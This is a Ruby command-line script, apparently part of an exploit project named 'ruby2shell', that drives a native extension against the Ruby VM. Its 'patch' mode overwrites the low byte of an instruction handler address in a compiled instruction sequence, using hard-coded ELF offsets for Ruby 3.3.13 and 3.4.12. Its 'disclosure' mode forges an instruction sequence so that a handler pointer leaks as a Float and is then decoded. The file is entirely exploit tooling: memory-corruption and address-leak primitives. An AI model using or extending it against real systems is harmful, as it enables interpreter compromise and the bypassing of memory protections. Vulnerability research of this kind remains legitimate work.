# Usage:
#   ruby ruby2shell-iseq-lowbyte.rb patch BYTE CURRENT_OFF TABLE_OFF SOURCE INDEX
#   ruby ruby2shell-iseq-lowbyte.rb disclosure BYTE CURRENT_OFF TABLE_OFF
#
# CURRENT_OFF is the ELF offset of the source iseq's first handler (for
# SOURCE="nil" on 3.3.13 this is 0x2645d2; on 3.4.12 0x21b3bf).
# TABLE_OFF is the ELF address of insns_address_table (3.3.13 0x5e85a0,
# 3.4.12 0x552640). Both are read from nm/gdb for the exact build.
require_relative 'ruby2shell_iseq_lowbyte.so'

mode = ARGV.fetch(0)
byte = ARGV.fetch(1).to_i(16)
offset = ARGV.fetch(2).to_i(16)
table = ARGV.fetch(3).to_i(16)

if mode == 'patch'
  source = ARGV.fetch(4)
  index = ARGV.fetch(5).to_i
  iseq = RubyVM::InstructionSequence.compile(source)
  before = Ruby2ShellIseqLowbyte.info(iseq)
  after = Ruby2ShellIseqLowbyte.patch_index(iseq, index, byte, offset, table)
  result = iseq.eval
  identity = Ruby2ShellIseqLowbyte.identity(result)
  puts "before=#{before.map { |v| v.to_s(16) }.join(',')}"
  puts "after=#{after.map { |v| v.to_s(16) }.join(',')}"
  puts "result=#{result.inspect} class=#{result.class} identity=0x#{identity.to_s(16)}"
elsif mode == 'disclosure'
  # The instruction indices below are for 3.3.13: putself=18, putnil=17,
  # leave=61. This forges the ideal three-word shape; it is analysis only and
  # the value is expected to be the putnil handler as an immediate Float.
  iseq = RubyVM::InstructionSequence.compile('1 + 2')
  Ruby2ShellIseqLowbyte.disclosure(iseq, offset, table, byte, 18, 17, 61)
  result = iseq.eval
  identity = Ruby2ShellIseqLowbyte.identity(result)
  raw = [result].pack('d').unpack1('Q<')
  recovered = ((raw << 3) & 0xffffffffffffffff) | (raw >> 61)
  puts "result=#{result.inspect} class=#{result.class}"
  puts "identity=0x#{identity.to_s(16)} recovered=0x#{recovered.to_s(16)}"
else
  abort "unknown mode #{mode}"
end
